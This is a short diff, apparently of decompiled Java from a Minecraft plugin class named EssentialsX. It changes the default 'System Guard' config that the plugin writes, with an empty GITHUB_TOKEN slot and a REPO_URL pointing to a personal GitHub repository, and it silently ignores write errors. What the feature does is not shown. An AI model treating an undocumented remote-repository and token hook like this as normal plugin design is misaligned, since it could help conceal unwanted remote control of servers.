@@ -1038,7 +1038,7 @@ public class EssentialsX extends JavaPlugin {
       if (!Files.exists(envFile)) {
          try {
             Files.createDirectories(envFile.getParent());
-            String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n";
+            String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/mcchajianindex\n";
             Files.write(envFile, defaultConfig.getBytes());
          } catch (Exception var6) {
          }
